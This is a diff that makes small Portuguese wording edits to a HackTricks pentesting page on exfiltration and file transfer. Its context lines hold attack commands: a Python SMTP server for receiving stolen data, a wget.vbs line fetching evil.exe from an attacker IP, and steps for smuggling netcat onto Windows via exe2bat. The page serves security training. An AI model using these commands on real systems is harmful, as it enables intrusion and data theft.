@@ -10,7 +10,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
@@ -241,7 +241,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Se você pode enviar dados para um servidor SMTP, você pode criar um SMTP para receber os dados com python:
+Se você pode enviar dados para um servidor SMTP, pode criar um SMTP para receber os dados com python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -309,13 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-O programa `debug.exe` não apenas permite a inspeção de binários, mas também possui a **capacidade de reconstruí-los a partir de hex**. Isso significa que, ao fornecer um hex de um binário, o `debug.exe` pode gerar o arquivo binário. No entanto, é importante notar que o debug.exe tem uma **limitação de montagem de arquivos de até 64 kb de tamanho**.
+O programa `debug.exe` não apenas permite a inspeção de binários, mas também tem a **capacidade de reconstruí-los a partir de hex**. Isso significa que, ao fornecer um hex de um binário, o `debug.exe` pode gerar o arquivo binário. No entanto, é importante notar que o debug.exe tem uma **limitação de montagem de arquivos de até 64 kb de tamanho**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Então, cole o texto no windows-shell e um arquivo chamado nc.exe será criado.
+Então cole o texto no windows-shell e um arquivo chamado nc.exe será criado.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
